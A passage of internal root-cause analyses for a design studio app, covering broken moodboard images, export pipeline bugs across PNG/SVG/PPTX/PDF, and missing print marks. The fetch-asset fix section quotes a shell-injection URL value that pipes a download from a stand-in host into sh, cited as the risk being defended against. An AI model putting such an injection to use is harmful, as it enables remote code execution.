**`fetch-asset` is absent**. So the moodboard/specimen writer, following the spec, is steered to hotlink. (It cannot substitute `/_api/asset` either: `http.ts:1783` that route is `POST`-only binary upload, no-SVG, sha8-flat-named — a paste/drag-drop sink, not a way for a research agent to pull a web URL.) ### 2. The canvas CSP unconditionally blocks external hotlinks `cspForCanvasShell` (`apps/studio/http.ts:123`) sets `img-src 'self' data: blob:`. The moodboard and specimens render inside the segregated canvas-origin iframe (DDR-054), which always carries this CSP. Any `` is refused by the browser → broken thumbnail. This is deterministic, not flaky — it is the "prázdný thumbnail, obrázek neexistuje" the user sees. The agent's own headless screenshot check does not reliably catch it: capture renders on the main origin under `cspForCapture()` (`http.ts:160`), which _also_ pins `img-src 'self' data: blob:`, so a hotlink that "curled fine" can still screenshot-blank — and, per the `canvas-images-download-first` memory, sometimes a hotlink renders in headless capture yet fails in the user's live browser (UA/referer/rate-limit policy). Either way the broken slot reaches the user. ### 3. Path-convention asymmetry breaks the images that _do_ get downloaded (compounding cause → the "images ARE present but broken" case) When an image _is_ on disk (agent downloaded ad-hoc, or a prior session left it), whether it renders depends entirely on the reference form, because the canvas-origin route gate (`isCanvasSafeRoute`, `http.ts:2149`) treats the two `assets` lanes differently: | Reference emitted in canvas | Canvas-origin handling | Result | | --- | --- | --- | | `/.design/assets/moodboard//x.png` | `designPrefix` branch (`http.ts:2190`) — allows **nested** paths, rejects only `_`-prefixed segments | ✅ served | | `/assets/moodboard//x.png` (DDR-150 canvas-relative form) | `/assets/` branch (`http.ts:2203`) — `if (rest.includes('/')) return false` → **flat single segment only** | ❌ 404 → broken | | `/assets/.png` (flat) | `/assets/` branch — flat, ok | ✅ served | But DDR-147 tells the writer to download into the **nested** `/assets/moodboard//` (`_bootstrap.md:362,406,425`). So an image downloaded per spec and then referenced via the natural canvas-relative `/assets/moodboard//x.png` form **404s at the gate** even though the file is on disk — precisely "obrázek je vložený, ale canvas říká, že neexistuje." ### Why "fresh repo" and why "sometimes" - **Fresh repo** is the reliable trigger: nothing is local yet, so the moodboard/specimens _must_ fetch fresh web imagery → 100% hit the hotlink/CSP path (cause 1+2). On an established repo some imagery is already local and renders, masking the bug. - **"Sometimes"** falls out of the combination: a zero-image tile is valid (the scrap layer carries it) and looks fine; a hotlinked slot with an `onError` handler degrades to a legible "scrap" (looks intentional); a hotlinked slot _without_ `onError`, or a downloaded-but-wrong-path slot, shows a raw broken thumbnail. Same underlying failure, three different-looking outcomes. **Hypothesis check (step 4.5).** The three causes above are not competing hypotheses — each is confirmed directly against source (missing bin + missing verb; the literal CSP directive; the two divergent gate branches). They are complementary contributing modes, so a full adversarial debate was unnecessary; the distinguishing evidence is the code itself. ## Impact - **Who:** every user running `/design:setup-ds` (and any specimen/canvas that places web-sourced imagery) — most visibly on a brand-new project, which is the first thing a new user does. - **What:** the Stage-3 **direction gate** is the moment the DS's whole visual direction is chosen; a moodboard with dead photo slots undermines exactly the decision it exists to support. Specimens (brand/iconography reference photos) degrade the same way. - **Severity:** High (product-credibility / first-run). Not data-loss, not a security hole — but it hits the highest-visibility, first-touch flow and the DDR-147 fix that was supposed to prevent it is silently inert. - **Workaround (today):** none clean. Zero-photo tiles that lean on the CSS/SVG scrap layer render fine; any tile that needs real photography is degraded until the imagery is made local by hand. ## Proposed Fix Two required parts (A unblocks the intended pipeline; B removes the path trap), plus a verification gate (C). ### A. Build the hardened `maude design fetch-asset` helper (unblocks download-first — the real fix) Per DDR-147 § Security follow-up item 1, in one reviewable place: - **New `apps/studio/bin/fetch-asset.sh`** — fixed, non-interpolated args: `curl --proto '=https' --proto-redir '=https' --max-redirs 0 --max-filesize --max-time `, a **resolved-IP SSRF gate** (reject loopback / link-local / RFC-1918 / `169.254.*` / `::1`), an `[a-z0-9._-]`-only **hashed output filename** with a `realpath` containment assertion under the target dir, URL passed after `--`. Never let the agent hand-author a `curl` line (the `https://x/a.png";curl evil|sh;"` shell-injection RCE DDR-147 calls out). - **Register `fetch-asset`** in the `cli/commands/design.mjs` verb allowlist (bin already ships via `package.json` `files`; confirm no new top-level dir needed). - **Flip the spec** in `plugins/design/skills/design-system/_bootstrap.md` (lines 362, 366, 406, 425) and `ux-research-agent.md`: from "helper doesn't exist → prefer hotlink fallback" to "download via `maude design fetch-asset` (now exists); hotlink only on download failure." Update DDR-147 § Security follow-up item 1 to mark the helper Done. ### B. Kill the nested-path trap (choose one; **B1 recommended**) - **B1 (recommended — least code, reuses the proven lane):** have `fetch-asset` write **flat** `assets/.` (it already produces a hashed name) and have writers reference `/assets/.`. This lands moodboard imagery on the already-battle-tested flat lane that `/_api/asset` uploads use, sidestepping the nested `/assets/` gate entirely. Drop the `assets/moodboard//` subdir convention from `_bootstrap.md`, or keep it only as an on-disk grouping while referencing via the `/.design/assets/moodboard//…` absolute form (which the `designPrefix` branch already serves). - **B2 (alternative):** widen the canvas-origin `/assets/` branch (`http.ts:2203`) to allow a nested `moodboard//…` subtree, keeping the `_`-segment + `CANVAS_ASSET_EXTS` guards. More surface area on the security-sensitive gate; only take this if the nested layout must stay canvas-relative. Guard with a `GET`-serves / `..`-rejects assertion in `test/canvas-origin-gate.test.ts`. Whichever is chosen, make the **reference form single-sourced** in the writer instructions so the agent can't emit the 404-ing variant. ### C. Fail loud during setup-ds instead of shipping a broken board - Extend `/design:smoke` (and/or the moodboard Step-2 pre-gate self-check in `_bootstrap.md`) to flag any `` with `naturalWidth === 0` after compose — today smoke catches blank iframes + unstyled specimens but not broken imagery. A broken moodboard should hard-fail the direction gate, not reach the user. ### Files to change - `apps/studio/bin/fetch-asset.sh` (new) - `cli/commands/design.mjs` (verb allowlist + help text) - `apps/studio/http.ts` (only if B2) - `plugins/design/skills/design-system/_bootstrap.md` (flip download-first guidance + reference form) - `plugins/design/agents/ux-research-agent.md` (if it carries hotlink guidance) - `.ai/archive/decisions/DDR-147-moodboard-first-discovery-default-directions.md` (mark follow-up item 1 done) - Tests: `cli/lib/plugin-cli-reachability.test.mjs` (fetch-asset reachable), a new fetch-asset SSRF/GET-405 unit test, `test/canvas-origin-gate.test.ts` (if B2) ## Testing Requirements - **Unit (fetch-asset):** rejects `http://`, any redirect, resolved IPs in loopback/link-local/RFC-1918/`169.254.*`/`::1`, oversize/over-time, filename with `/`/`..`/metacharacters; `GET → 405`; happy-path `https` → hashed file under the target dir with `realpath` containment holding. - **Reachability:** `maude design fetch-asset` dispatches (extend `plugin-cli-reachability.test.mjs`); ban any lingering agent-authored `curl` in plugin markdown. - **Canvas-origin gate (if B2):** `/assets/moodboard//x.png` serves 200; `_`-prefixed + traversal still 403. - **Integration / repro:** fresh repo → `design init` → `flow init` → `/design:setup-ds` → assert every moodboard + specimen `` has `naturalWidth > 0` in the **live browser** (not just headless capture — cause 2 hid there). - **Regression:** the `canvas-images-download-first` memory scenario — a wikimedia URL that curls fine must render locally after fetch. ## Complexity **Medium.** Parts B (path) and C (smoke gate) are small and mechanical. Part A is the weight: it is a security-sensitive helper (SSRF + shell-injection surface) that needs the hardened arg construction and its own test suite before it can be trusted in the untrusted-fetch loop — which is the whole reason it was deferred in the first place.

decision.title: RCA: „nefunguji exporty" v2 — 6 scope/chrome/format defects in the export pipeline
decision.rationale:
# RCA: „nefunguji exporty" v2 — 6 scope/chrome/format defects in the export pipeline

> Sibling to [`issue-nefunguji-exporty.md`](./issue-nefunguji-exporty.md) (v1 — the
> Playwright-missing 500 + SVG `formatXML` + cross-origin bridge, all landed in
> `bf84825`). This v2 covers a cluster of **6 user-reported defects** (verbatim
> Czech bug report) that survived the v1 fix. No tracker number
> (`integrations.tracker.provider = github`; human bug report) — commits `refs
> nefunguji-exporty-v2`. Plan: [`.ai/plans/export-pipeline-fixes.md`](../../plans/export-pipeline-fixes.md).

## Summary

With rendering working again (v1), the exports came out **wrong**, not broken:

| # | Symptom | Root cause | Fix |
|---|---------|------------|-----|
| 1 | PNG resolution tiny; no size control | `png.ts` defaulted `scale=1`; dialog sent no size | Dialog `Size` select (1×/2×/3×, default 2×) → `options.scale`; `png.ts` default 2× + `clampScale` |
| 2 | Minimap + presence avatars leak into PNG/PDF | `hide-chrome` consumer **existed** but its selector list named non-existent classes (`.dc-mini-map`/`.dc-world-map`) and omitted `.dc-participants`, `.dc-zoom-tb`, `.dc-ai-banner`, … | Rewrote `_shell.html` hide list against the live class names |
| 3 | `scope=selection` exports the whole artboard | TWO causes: (a) dialog cleared the selection so `_active.json.selected` was null at export → `scope.ts` recursed to artboard; (b) PNG/SVG/HTML adapters passed `--widen-to-artboard` **unconditionally** for every single target | (a) snapshot the live selection at submit into `options.selection`, preferred by `resolveScope`; (b) `Target.widen` flag — `selection` sets `false` |
| 4 | SVG drops the background fill (Affinity) | TWO causes: (a) `dom-to-svg` doesn't paint the captured root's background; (b) **the real one** — modern Chromium serializes DS colours as `oklch(...)` and dom-to-svg copies them through verbatim; Affinity / older Illustrator / Inkscape can't parse CSS Color 4 and silently drop every such fill/stroke | (a) prepend a backdrop `<rect>` from the artboard's effective bg; (b) convert EVERY `oklch/oklab/lch/lab/color()` in the serialized SVG to sRGB `rgb()/rgba()` via a 1×1 canvas |
| 5 | HTML `scope=artboard` always emits artboard #1 | `scope.ts` artboard fallback was `[data-dc-screen]:first-of-type`; `_png-playwright.mjs` also hard-pinned `:first-of-type` to (0,0) | `scope.ts` targets `[data-dc-screen="<activeId>"]` by id (active = selection host or viewport-centre artboard); PNG shim pins the captured element's OWN artboard |
| 6 | PPTX won't open in **anything** | `mergePptx()` had THREE bugs (see §Item 6) — the showstopper: `presentation.xml.rels` rebuild used `<Relationship[^/]*\/>`, but `Type="http://…"` contains `//` so `[^/]*` matched nothing → slideMaster/theme/presProps rels dropped → `sldMasterIdLst` dangled → unopenable | Rewrote `mergePptx`: preserve non-slide rels (`[^>]*`), namespace per-slide media (`media/sN-…`), Content-Types Override per slide, drop notesSlide rels |

## Detail

### Item 2 — the consumer existed; the selectors were wrong

The plan hypothesised the `?hide-chrome=1` consumer "does not exist." It **does** —
`plugins/design/templates/_shell.html` carries a `<style id="canvas-hide-chrome"
media="not all">` block that the shell bootstrap flips to `media="all"` when the
param is set. The real bug: the selector list referenced **`.dc-mini-map` /
`.dc-mini-world-map` / `.dc-world-map`**, none of which exist — the live minimap
is **`.dc-mm`** (`canvas-lib.tsx:1950`). It also omitted the presence avatars
**`.dc-participants`** (`participants-chrome.tsx:248`), the zoom toolbar
`.dc-zoom-tb`, the AI banner `.dc-ai-banner`, undo HUD `.dc-undo-hud`, cursors
`.dc-cursor-overlay`, and the toolbars `.dc-multi-artboard-tb` / `.dc-elem-ctx-tb`.
So the two most-visible overlays the user complained about (minimap bottom-right,
avatars top-right) sailed straight through. Fix = rebuild the list against the
authoritative ignore list in `marquee-overlay.tsx:56` + the presence/banner/HUD
classes. PDF shares the `canvasShellUrl` path, so one template fix covers both.

### Item 3 — selection scope had two independent root causes

1. **Selection survival.** The bridged export reads `inspect.state.selected`
   (the persisted `_active.json`). Opening/submitting the dialog can clear the
   canvas selection, so by export time `selected` is null and `scope.ts`
   `selection` recurses to `artboard`. Fix: the dialog snapshots the LIVE
   selection from `useSelectionSetOptional()` at submit and rides it on
   `options.selection`; `resolveScope` prefers it over `activeJson`. Survives the
   cross-origin bridge unchanged (it's just data on the `options` bag).
2. **Unconditional widening.** Even with the selector intact, `png.ts` / `svg.ts`
   / `html.ts` pushed `--widen-to-artboard` for *every* non-multi target — so
   `selection` always widened to the enclosing artboard. Fix: `Target.widen`,
   set `false` for `selection`.

### Item 5 — `:first-of-type` in two places

`scope.ts` artboard fallback AND `_png-playwright.mjs`'s position-reset both
hard-coded `[data-dc-screen]:first-of-type`. Even when the PNG shim widened the
*handle* to artboard #2 correctly, it pinned artboard **#1** to (0,0). Fix:
`scope.ts` now targets the active artboard by id (`options.artboardId`, derived
from the selection's `artboardId` or the artboard under the viewport centre), so
every format — including PDF, whose shim never widens — renders the right one.
The PNG shim pins `el.closest('[data-dc-screen]')` of the captured element.

### Item 4 follow-up — oklch is the actual culprit, not just the missing root rect

First pass added a backdrop `<rect>` but set `fill="oklch(0.975 0.008 78)"` — because
`getComputedStyle().backgroundColor` returns `oklch(...)` verbatim in current
Chromium. Affinity dropped it exactly like dom-to-svg's own oklch rects (a live
export had **400** `oklch(` tokens). The complete fix converts every CSS Color 4
function in the serialized SVG to sRGB through a 1×1 canvas (`ctx.fillStyle =
color; getImageData`) — memoized, applied in the shared `serializeOne` so single
+ multi both benefit. Verified: 0 `oklch`/`oklab`/`color()` remain; the SVG
renders the full background + all element colours.

### Item 6 — the merge corrupted the package THREE ways

The first pass (Content-Types only) was necessary but **not sufficient** — the
user reported the deck still wouldn't open in *anything* (not just strict
consumers). Deep inspection of a real 5-artboard merge (`unzip` + a custom
all-refs-resolve validator) found three independent bugs in `mergePptx`, all in
the byte-merge of N independent single-slide dom-to-pptx decks:

1. **Dropped non-slide presentation rels (the showstopper).** The rels rebuild
   did `presRels.match(/<Relationship[^/]*\/>/g)` — but every `Type="http://…"`
   contains `//`, so `[^/]*` stops at the first slash and the pattern matches
   **nothing**. `nonSlideRels` was always `[]`, so the rebuilt
   `presentation.xml.rels` contained ONLY the slide rels and **dropped
   slideMaster / theme / presProps / viewProps / notesMaster / tableStyles**.
   `presentation.xml`'s `<p:sldMasterId r:id="rId1"/>` then pointed at a
   non-existent relationship → dangling ref → unopenable in every app. Fix:
   strip ONLY the slide rels from the base file (`[^>]*`, which doesn't truncate
   on `//`) and append fresh slide rels; keep everything else verbatim.

2. **Colliding media.** Each input is an independent single-slide deck whose
   images are `ppt/media/image-1-*`. The merge copied only the BASE file's media,
   so slides 2..N referenced `image-1-*` that were either slide 1's images (wrong
   content) or — for a slide needing MORE images than the base had (a real case:
   base/slide1 = 14 images, slide3 = 32) — **missing parts**. Fix: copy each
   input's media under a per-slide prefix (`media/sN-…`) and rewrite that slide's
   rels Targets to match.

3. **Missing Content-Types Overrides** (the original item-6 finding). Only
   `slide1` was declared; strict consumers reject `slideN.xml` parts with no
   Override. Fix: re-emit a contiguous 1..N Override set.

Plus: the per-slide `notesSlide` rel is stripped (one notesSlide can't be shared
across N slides; the orphaned part is harmless). Verified with a custom OOXML
validator — 132 parts, 11 rels files, **all relationship Targets resolve, every
part has a content type, every `r:id` resolves**. Single-artboard PPTX is
unaffected (raw `readFileSync` pass-through, no merge).

## Update (2026-06-01) — PPTX architecture superseded

The Content-Types + media + rels merge fixes above made the **dom-to-pptx**
package *valid*, but live testing showed dom-to-pptx still **reflows text**
(broken layout in PowerPoint/Canva), and the follow-up **SVG-image** approach
(`svgBlip`) is **rejected by Canva as corrupt** + rasterized by Keynote (not
editable). The user needs editable + Canva + 1:1. PPTX was therefore re-built on
**`svg2pptx`** (SVG → native editable shapes) with a PNG fallback — see
**[DDR-069](../decisions/DDR-069-pptx-native-via-svg2pptx.md)**. The corrected
OOXML merge logic from this RCA lives on in `mergeDecks` (no media-collision
namespacing needed since svg2pptx emits no media). `dom-to-pptx` +
`_pptx-playwright.mjs` + `_enumerate-artboards-playwright.mjs` are now dead code
(cleanup pending).

## Verification

- `bun test test/exporters/` — 46 → green incl. new `scope` (selection-passthrough,
  artboard-by-id, widen flag), `png` (`clampScale`), and `pptx-merge`
  (Content-Types Overrides) cases.
- Full dev-server suite 907/907 green (no regression of the v1 fixes).
- Live matrix (agent-browser) — see plan §Validation.

## Decisions

- **Selection model = pass-through snapshot** (not "prevent the dialog clearing
  selection"): deterministic, survives the cross-origin bridge, and no coupling
  to dialog focus behaviour.
- **PPTX = patch the regex merge** (not reassemble via pptxgenjs): single-artboard
  was already valid, so the defect was localized to `[Content_Types].xml`; a full
  pptxgenjs reassembly would be a much larger rewrite for no extra correctness.

Both recorded in the export-pipeline-fixes DDR (see `/flow:done` DDR sweep).

decision.title: RCA: „nefunguji exporty" — every rendered export 500s with an opaque stack trace
decision.rationale:
# RCA: „nefunguji exporty" — every rendered export 500s with an opaque stack trace

> No tracker number (`integrations.tracker.provider = github`, but the report is a
> human bug: *"nefunguji exporty"*). Reproduced 2026-05-31 against the live dev
> server on `:4399` (serving this repo's own `.design/`, active canvas
> `ui/Smoke TSX.tsx`).

## Summary

Every export format that renders the canvas through a headless browser —
**PNG / PDF / SVG / HTML / PPTX / Canva** — fails with **HTTP 500**. Only `zip`
(`scope=project-raw`, a pure file copy, no rendering) returns 200. The 500 body
is a raw multi-line Playwright stack trace surfaced verbatim to the user:

```
export failed: _png-playwright exited 1: …
browserType.launch: Executable doesn't exist at
/Users/…/Library/Caches/ms-playwright/chromium_headless_shell-1223/chrome-headless-shell-mac-arm64/chrome-headless-shell
```

## Root Cause

- **Playwright the npm package is installed, but its Chromium browser binary was
  never downloaded** (`npx playwright install chromium` was never run on this
  machine, or the `ms-playwright` cache was cleared). The package install and the
  browser install are two separate steps.
- **Every rendered-export format shells out to a Playwright shim**
  (`dev-server/bin/_png|_pdf|_svg|_html|_pptx|_enumerate-artboards-playwright.mjs`)
  whose first action is `const browser = await chromium.launch()`. With no binary
  on disk, `launch()` rejects immediately. The shim has no `try/catch` around the
  launch, so the rejection prints Playwright's full stack to stderr and exits 1.
  `exporters/*.ts` rethrows `"<shim> exited 1: <stderr>"`, and the `/_api/export`
  handler (`http.ts:657`) returns it as the 500 body. The user sees a stack
  trace, not a fix.
- **The diagnostic layer can't catch it.** `plugins/design/dependencies.json`
  checks playwright with `npx --no-install playwright --version` — that proves the
  *package* resolves, never that the *browser binary* exists. So `maude doctor` /
  `/design:init` report "playwright OK" while exports fail at runtime. The export
  shims aren't even listed in the dep's `usedBy`.
- **Not the uncommitted tree.** The working tree carries Phase 24 annotation
  draw-modifiers + a canvas-shell theme-follow refactor; both are additive feature
  work and are not on the export code path. Reverting them does not change the
  failure. The export unit suite is green (`bun test test/exporters/` → 41 pass).

## Impact

- **Severity: High (user-facing, total).** 6 of 7 export formats are unusable on
  any machine where the Chromium binary isn't present — which includes every fresh
  install, every cleared cache, and CI. The single working format (`zip`) doesn't
  render anything.
- **Undebuggable for the user.** The 500 dumps a stack trace with no remediation,
  so "exports don't work" has no visible cause. This is the costliest part: the
  failure is recoverable in one command, but nothing tells the user which command.

## Proposed Fix

1. **Graceful, actionable runtime error (the durable code fix).** Add a shared
   launcher `dev-server/bin/_pw-launch.mjs` exporting `launchChromium()` + a pure,
   testable `isMissingBrowserError()`. On the missing-binary failure it prints a
   single line — `Playwright's Chromium browser isn't installed. Run: npx
   playwright install chromium` — and exits with a distinct code, so the
   `/_api/export` 500 body becomes the remediation instead of a stack trace. Any
   *other* launch error is rethrown untouched (real diagnostics preserved). Wire
   all 7 shims (`_png/_pdf/_svg/_html/_pptx/_enumerate-artboards/_screenshot`).
2. **Honest dependency metadata.** In `dependencies.json`, list the export shims in
   the playwright `usedBy` and spell out in `fallbackBehavior` that the Chromium
   binary is a separate install. (The `check` command is left alone — verifying the
   binary from `maude doctor`'s cwd has playwright-resolution pitfalls that risk
   false negatives; the runtime actionable error is the reliable guard.)
3. **Immediate remediation.** Run `npx playwright install chromium` to unblock
   exports on this machine now.

## Secondary bug uncovered (SVG `formatXML`)

Once the browser launched, a **second, pre-existing bug surfaced**: SVG export
500'd with `TypeError: formatXML is not a function`. The multi-target branch of
`_svg-playwright.mjs` destructured `formatXML` from `window.domToSvg` and called
it as a pretty-printer — but `dom-to-svg` exports only `documentToSVG` /
`elementToSVG` / `inlineResources`; there is no `formatXML`. It was invisible
until now because the browser never launched, so the `evaluate()` was never
reached. Every `canvas-as-separate` / multi SVG export hit it. Fix: serialize
straight with `XMLSerializer`, matching the working single-target `serializeOne`.

## Bug #2 — UI export 403s "Forbidden (canvas origin)" (the user's actual symptom)

The curl reproduction above hits the MAIN origin directly, so it never saw the
bug the user reports from the ⌘E dialog. The export dialog (`export-dialog.tsx`)
renders **inside the canvas iframe**, which since phase-9.1 is served from a
**segregated canvas origin** (default ON) whose CSP is `connect-src 'self'` and
whose route allowlist deliberately excludes the privileged `/_api/export` +
`/_api/export-history` (DDR-060, the F1 cross-origin re-audit). A relative
`fetch('/_api/export')` from the dialog therefore resolves to the canvas origin,
which 403s with **`Forbidden (canvas origin)`** (`server.ts:222`). Reproduced:
`POST <canvasOrigin>/_api/export` → 403. This is a regression — the Phase 6.5
export dialog predates the origin split, which never wired a bridge for the
in-canvas export UI. UI export is broken whenever the split is on (the default).

**Fix:** a `postMessage` bridge over the existing origin-validated `dgn` channel
(the one comments/selection already use). When the dialog detects a cross-origin
parent (`isCrossOriginFramed()`), it asks the trusted main shell to run the
export same-origin and stream the download, then replies with the saved filename
or an error. `/_api/export` stays OFF the canvas allowlist (security intact); the
parent only acts on messages from the validated `canvasOrigin` (not a generic
fetch proxy). `export-history` is bridged the same way so the Recent tab works.
Files: `export-dialog.tsx` (iframe client + `bridgeRequest`), `client/app.jsx`
(`runBridgedExport` / `runBridgedHistory` in the `onMessage` handler).

**Browser-verified** (agent-browser, live UI): ⌘E → PNG → Export → status
`Saved ui-smoke_tsx.png`; the Recent tab populates (history bridge). Before the
fix the same flow showed `Export failed: Forbidden (canvas origin)`.

## Testing Requirements

- Unit: `isMissingBrowserError()` matches the real Playwright "Executable doesn't
  exist" message and rejects unrelated launch errors.
- Reproduction: re-POST every format to the live server; all rendered formats
  return 200 after the browser install; before install they return a 500 whose
  body is the one-line remediation, not a stack trace.

decision.title: RCA: PDF print export — in-app guides leak into the file, real crop/registration/bleed marks silently missing
decision.rationale:
# RCA: PDF print export — in-app guides leak into the file, real crop/registration/bleed marks silently missing

## Summary

Reported from a real export: `.../alligators_export/2026/nabor_2026/ui-alligatorsacko.pdf`, produced from `/Users/iagh/git/alligators/.design/ui/AlligatorsAcko.tsx` (two `kind="print"` A1 artboards, `acko-front` / `acko-back`). Two independent bugs in Maude's PDF exporter (`apps/studio/`) combine to produce exactly the reported symptom: the output shows the **in-app-only bleed/trim/margin guide overlay** (never meant to leave the editor) baked into the page content, while the **real print marks** (crop marks, registration marks, and the BleedBox/TrimBox geometry that drives them) **never get drawn at all**, on either page.

- **Bug A** — `.dc-artboard-guides` (the overlay class that renders bleed tint / trim line / margin line, `apps/studio/artboard-guides-overlay.tsx` + `apps/studio/print-overlay-content.tsx`) is missing from the `#canvas-hide-chrome` CSS selector allowlist in `plugins/design/templates/_shell.html`. Every other piece of editor chrome (minimap, tool palette, presence, selection halos, annotations, comments…) is listed there and gets suppressed during a capture render; the print-guides overlay was never added to that list, so it renders straight into the Chromium `page.pdf()` capture whenever it happens to be toggled on for that canvas.
- **Bug B** — `readArtboardPrintProp` (`apps/studio/canvas-edit.ts:4031`) only recognizes an **inline object literal** for the artboard's `print` JSX prop (`print={{ paper: 'a4', bleedMm: 3 }}`). It does not resolve identifier references. `AlligatorsAcko.tsx` defines the print spec once and shares it between both artboards — `print={A1_PRINT as any}` — which is a completely natural, DRY way to author two artboards with the same paper/bleed. Because the prop's JSX expression is a `TSAsExpression` wrapping an `Identifier`, not an `ObjectExpression`, the function returns `null` for both artboards. `apps/studio/exporters/pdf.ts`'s post-pass then silently skips `applyPrintBoxesAndMarks` for every page — no BleedBox/TrimBox adjustment, no crop marks, no registration marks, on the whole document.

Neither bug touches the multi-page "artboards as separate pages" loop itself — that loop (`exporters/pdf.ts` `run()`, the `for (const w of written)` block) is structurally correct and applies the print post-pass independently per written page. Once Bug B is fixed, marks/bleed should already land on every `kind="print"` page uniformly. There is one secondary, lower-probability risk in that same correlation path worth closing at the same time (see Impact/Proposed Fix).

## Root Cause

### Bug A — print guides overlay is not on the capture-mode hide list

`plugins/design/templates/_shell.html:78-122` defines:

```css
<style id="canvas-hide-chrome" media="not all">
  .dc-mm, .dc-zoom-tb, .dc-tool-palette, ...
  .dc-participants, .dc-cursor-overlay,
  .dc-cv-halo, .dc-cv-group-bbox, ...
  .dc-annot-svg, .dc-annot-ctx, ...
  .cm-layer, .cm-pin, ...
  .dgn-pin, #dgn-pin-layer,
  .dc-ai-banner, .dc-undo-hud,
  .dc-activity-rim,
  .dc-hmr-holding,
  .dc-artboard-label,
  [data-dc-overlay],
  [data-mdcc-annotations] { display: none !important; }
</style>
```

flipped from `media="not all"` to `media="all"` when the shell is loaded with `?hide-chrome=1` — which is exactly what every exporter (`exporters/index.ts` `canvasShellUrl()`) sets on the URL it hands to the Playwright shims. This is the sanctioned mechanism for "capture only the artboard content, not the editor's own chrome" (see the file's own header comment, and `artboard-guides-overlay.tsx`'s header comment: *"guides are never exported/screenshotted"*).

`artboard-guides-overlay.tsx:241-243` mounts guide content in a `<div className="dc-artboard-guides" aria-hidden="true" ...>`, which is where `print-overlay-content.tsx`'s bleed-tint/trim-line/margin-line divs render for a `kind="print"` artboard whenever its `visibility.print` flag is true. **`.dc-artboard-guides` is absent from the selector list above.** The class was clearly meant to be covered by the same "chrome never leaks into export" contract as every other overlay in that list — it just wasn't added when feature-2-print-artboards shipped the print overlay content (`39966b7f feat(studio): print artboards — paper presets, bleed/marks overlay, DPI + print-ready PDF export`).

The `print` visibility flag itself is **not** capture-session-local — `canvas-lib.tsx:1553-1567` seeds it from the same disk-persisted `_canvas-state/<slug>.view.json` (via `window.__canvas_meta__`) that the live editor reads and writes through the View-menu toggle. So whatever the user last had toggled on while designing the artboard (very plausible here — you'd want the bleed/trim guides visible while placing content near an A1 edge) is exactly what the headless export capture sees too. That is why the exported PDF shows guides "from the canvas" rather than nothing.

### Bug B — `print={A1_PRINT as any}` is invisible to the static AST reader

`apps/studio/canvas-edit.ts:4031-4047`:

```ts
export function readArtboardPrintProp(
  canvasAbsPath: string,
  source: string,
  artboardId: string
): Record<string, unknown> | null {
  const parsed = parseSync(canvasAbsPath, source, { sourceType: 'module' });
  if (parsed.errors && parsed.errors.length > 0) return null;
  const artboards = collectJsxByTag(parsed.program, 'DCArtboard');
  const target = artboards.find((a) => getStringAttr(a.openingElement, 'id') === artboardId);
  if (!target) return null;
  if (getStringAttr(target.openingElement, 'kind') !== 'print') return null;
  const attr = findAttribute(target.openingElement, 'print');
  if (attr?.value?.type !== 'JSXExpressionContainer') return null;
  const expr = attr.value.expression as AnyNode | undefined;
  if (expr?.type !== 'ObjectExpression') return null;   // <-- only literal objects pass
  return objectExpressionToPlain(expr);
}
```

This is a deliberately no-eval, source-only reader (per its own T5 design intent — export must never disagree with what the artboard's JSX prop literally says). But it hard-requires `expr.type === 'ObjectExpression'`. `AlligatorsAcko.tsx:76` declares:

```ts
const A1_PRINT = { paper: "a1", orientation: "portrait", bleedMm: 3 } as const;
```

and both artboards use it (`AlligatorsAcko.tsx:285, 288`):

```tsx
<DCArtboard id="acko-front" ... kind="print" print={A1_PRINT as any}>
<DCArtboard id="acko-back"  ... kind="print" print={A1_PRINT as any}>
```

`attr.value.expression` here is a `TSAsExpression` wrapping an `Identifier` (`A1_PRINT`), never an `ObjectExpression` — even without the `as any` cast, a bare `print={A1_PRINT}` would fail the same check (`Identifier` ≠ `ObjectExpression`). `readArtboardPrintProp` returns `null` for **both** artboards.

Downstream, `exporters/pdf.ts` `run()` (~line 407):

```ts
if (printProp && printOpts) {
  ...
  applyPrintBoxesAndMarks(page, bleedMm, printOpts);
} else if (!printProp && pageFit) {
  await applyPageFit(out, pageIndex, pageFit);
}
```

`printProp` is `null` → the whole `applyPrintBoxesAndMarks` branch (BleedBox/TrimBox sizing **and** crop/registration mark drawing) is skipped for every page. `pageFit` is presumably unset for a print export, so the `else if` doesn't fire either — the page passes through completely untouched by the print post-pass. This reproduces the user's exact second symptom ("ostatni znacky tam nejsou" — the other marks aren't there) on **both** pages of this specific file, confirming it isn't a per-page/per-artboard flake but a systemic silent no-op for any canvas that shares a `print` spec via a variable instead of repeating an inline literal per artboard.

Confirmed no existing coverage of this shape: `apps/studio/test/element-structural-edit.test.ts`'s `readArtboardPrintProp` describe block (the only test file exercising this function) only covers inline-object and inline-JSON-shaped `print={{...}}` props, an absent prop, an unknown artboard id, and a stale prop on a non-`print`-kind artboard — never an identifier/variable reference. That's the test gap that let this ship.

### Multi-page correlation (verification of the user's third ask)

For a whole-canvas "artboards as separate pages" export, `_pdf-playwright.mjs` writes one file per artboard via `safeArtboardFilename(screenId, i, 'pdf')` (`bin/_pw-launch.mjs:127-131`), where `screenId` is the artboard's `data-dc-screen` attribute — which `canvas-lib.tsx:2124/2183` sets directly to the artboard's own `id` prop (`data-dc-screen={id}`). `exporters/pdf.ts` then recovers `artboardId` as `path.basename(p, '.pdf')` and passes it back into `readArtboardPrintProp(abs, text, w.artboardId)` — so the per-page loop in `run()` re-resolves each page's own print prop independently and applies `applyPrintBoxesAndMarks` (or not) per page. This part of the pipeline is correct: once Bug B stops returning `null`, both `acko-front` and `acko-back` (and any N-page canvas) will each get their own correctly-scoped BleedBox/TrimBox/marks, not just page 1.

One latent risk in the same path, not triggered here but worth closing alongside: `safeArtboardFilename` falls back to a positional `artboard-${index+1}.pdf` name whenever the artboard's `id` doesn't match `SAFE_ARTBOARD_ID_RE` (`/^[A-Za-z][\w-]{0,63}$/`). If that ever fires, `path.basename(p, '.pdf')` no longer equals the real artboard id, `readArtboardPrintProp` looks up a non-existent id, and marks silently drop for just that one page — a much harder bug to notice because the rest of the pages would look correct. `acko-front` / `acko-back` are both safe IDs, so this isn't in play for the reported file, but it's the same "silent `null` on mismatch" failure shape as Bug B and should get a regression test while this area is being touched.

## Impact

- **Every** print-ready PDF export of a `kind="print"` artboard whose `print` prop is authored via a shared variable/const (rather than a repeated inline literal) silently ships with **no bleed, no crop marks, no registration marks** — the export looks like a plain page-fit PDF, which is unusable for an actual print vendor (crop marks and bleed are exactly what a print shop needs to trim to size).
